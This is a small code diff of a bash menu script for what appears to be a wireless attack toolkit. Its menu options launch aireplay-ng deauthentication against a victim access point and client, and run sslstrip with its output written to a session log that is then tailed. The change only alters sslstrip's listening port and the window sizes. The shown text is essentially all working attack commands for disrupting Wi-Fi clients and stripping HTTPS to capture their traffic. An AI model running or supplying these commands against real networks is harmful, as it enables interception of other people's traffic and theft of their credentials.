@@ -77,8 +77,8 @@ menu()
         sudo xterm -bg black -fg blue -T "Aireplay" -geometry 90x20 -e aireplay-ng --deauth 1 -a $VICTIM_BSSID -c $STATION wlan0mon &>/dev/null &
     elif [[ $choice == 8 ]]; then
         echo -e "SSL Strip Log File\n" > $sessionfolder/ssl.log
-    	sudo xterm -T "SSL Strip" -geometry 50x10 -e sslstrip -p -l 443 -k -f lock.ico -w $sessionfolder/ssl.log &>/dev/null &
-        sudo xterm -T "Tailed log" -geometry 50x10 -e tail -f $sessionfolder/ssl.log &>/dev/null &
+    	sudo xterm -T "SSL Strip" -geometry 35x10 -e sslstrip -p -l 8080 -k -f lock.ico -w $sessionfolder/ssl.log &>/dev/null &
+        sudo xterm -T "Tailed log" -geometry 35x10 -e tail -f $sessionfolder/ssl.log &>/dev/null &
     elif [[ $choice == 9 ]]; then
         get_name "BRIDGE_NAME="; BR_NAME=$USE
         get_name "AP="; AP_NAME=$USE
